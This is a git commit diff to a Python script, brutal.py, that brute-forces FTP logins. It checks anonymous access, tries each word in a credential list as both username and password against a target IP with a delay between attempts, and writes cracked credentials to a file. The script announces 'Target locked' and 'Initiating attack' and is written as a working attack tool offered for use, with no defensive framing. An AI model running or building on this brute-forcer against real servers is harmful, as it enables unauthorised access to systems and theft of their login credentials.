c4e3b26d8f70040c365f774acbb03d9c4b0c436d
Joel <joel.eldoe2000@gmail.com>
2021-11-01 23:29:07 +0530

    Updated ftpBruteForce() function and added code for storing cracked credentials in a file

--- brutal.py
+++ brutal.py
@@ -8,7 +8,7 @@ class colors:
     YELLOW = '\033[93m' # YELLOW COLOR
     RED = '\033[91m'    # RED COLOR
     RESET = '\033[0m'   # RESET COLOR
-
+'''
 def anonLogin(IP):
     ftp = ftplib.FTP(IP)
     try:
@@ -18,28 +18,58 @@ def anonLogin(IP):
     except Exception as e:
         print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
         print(e)
-
+'''
 def ftpBruteForce(IP):
-    f = open('100-credentials-list.txt', 'r')
+    # List to store the correct credentials
+    credentials = []
+    
+    # Check anonymous login
+    try:
+        ftp = ftplib.FTP(IP)
+        ftp.login('anonymous','')
+        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
+        credentials.append("anonymous:''")
+        ftp.quit()
+    except Exception as e:
+        print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")
+        print(e)
 
+    # Starting brute-force attack
+    f = open('100-credentials-list.txt', 'r')
     for word in f.readlines():
         word = word.strip('\n')
         try:
             ftp = ftplib.FTP(IP, timeout=1)
             ftp.login(word,word)
             print(f"[{colors.GREEN}+{colors.RESET}] Login successful using {word}:{word}")
+            credentials.append(word+":"+word)
             ftp.quit()
             time.sleep(3)
         except Exception as e:
             print(f"[{colors.RED}-{colors.RESET}] Login failed using {word}:{word}")
+    f.close()
+
+    # Checking whether we got some credentials or not
+    if(len(credentials) != 0):
+        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} credentials found!")
+        filename = f"{IP}-FTP-cracked-list.txt"
+        os.system(f'touch {filename}')
+        f = open(filename, 'w')
+        for creds in credentials:
+            f.write(creds+"\n")
+        f.close()
+    else:
+        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!")
+
 
 def main():
     try:
         target = sys.argv[1]
         checker = target.split('.')
         if(len(checker) == 4):
-            print(f"Target locked: {target}\n")
-            anonLogin(target)
+            print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
+            print("Initiating attack...\n")
+            time.sleep(3)
             ftpBruteForce(target)
         else:
             print(f"[{colors.RED}-{colors.RESET}] Incorrect argument")
